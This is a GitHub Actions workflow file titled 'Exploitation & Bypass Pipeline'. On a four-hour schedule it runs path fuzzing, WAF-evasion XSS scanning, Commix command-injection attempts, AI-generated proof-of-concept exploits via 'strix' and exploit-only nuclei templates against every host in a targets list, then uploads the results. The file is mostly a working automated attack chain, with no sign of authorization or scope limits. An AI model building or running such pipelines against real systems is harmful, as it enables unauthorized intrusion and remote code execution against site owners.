name: 🤖 Exploitation & Bypass Pipeline

on:
  workflow_dispatch:
  schedule:
    - cron: '0 */4 * * *'

jobs:
  exploit:
    runs-on: ubuntu-latest
    timeout-minutes: 120
    steps:
      - uses: actions/checkout@v4

      - name: Install Attack Tools
        run: |
          chmod +x setup.sh
          ./setup.sh
          echo "export PATH=$PATH:$(go env GOPATH)/bin" >> $GITHUB_ENV

      - name: 🎯 Phase 1: Path Discovery (FFUF + Dirsearch)
        run: |
          mkdir -p reports
          while read target; do
            echo "🔍 Fuzzing paths on $target..."
            ffuf -u https://$target/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac -o reports/paths_${target}.json || true
            dirsearch -u https://$target -e php,html,js,bak,txt,json -o reports/dirsearch_${target}.txt || true
          done < config/targets.txt

      - name: 🚧 Phase 2: WAF Bypass & XSS (XSSHunt + Dalfox)
        run: |
          while read target; do
            echo "🛡️ Bypassing WAF on $target..."
            xsshunt -u https://$target --bypass -o reports/waf_bypass_${target}.txt || true
            dalfox url https://$target --waf-evasion -o reports/dalfox_${target}.txt || true
          done < config/targets.txt

      - name: ⚡ Phase 3: Command Injection (Commix)
        run: |
          while read target; do
            echo "💥 Testing RCE on $target..."
            python tools/commix/commix.py --url https://$target --batch --output-dir reports/commix_${target} || true
          done < config/targets.txt

      - name: 🧠 Phase 4: AI Exploitation (Strix + Nuclei Exploits)
        run: |
          while read target; do
            echo "🤖 Generating PoC for $target..."
            strix --target $target --output reports/strix_poc_${target}.json || true
            # تشغيل قوالب الاستغلال فقط (بدون القوالب العادية)
            nuclei -u https://$target -tags exploit,waf-bypass -o reports/nuclei_exploits_${target}.txt || true
          done < config/targets.txt

      - name: 📤 Upload Exploit Reports
        uses: actions/upload-artifact@v4
        with:
          name: Exploit-Reports
          path: reports/
